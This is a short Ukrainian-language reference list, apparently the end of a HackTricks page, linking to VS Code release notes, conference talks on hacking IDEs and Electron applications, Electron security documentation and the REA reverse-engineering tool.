- [18] [VS Code 1.89 / розширення локального workspace](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: як я зламав усі основні IDE за 2 тижні](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: злам популярних настільних застосунків і виявлення нової поверхні атаки в Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Безпека Electron](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [Параметр webPreferences у Electron BrowserWindow](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: зворотне проєктування будь-чого](https://github.com/morluto/rea)
- [24] [Відновлення JavaScript-артефактів у REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [Робочі процеси JavaScript-застосунків між рівнями в REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
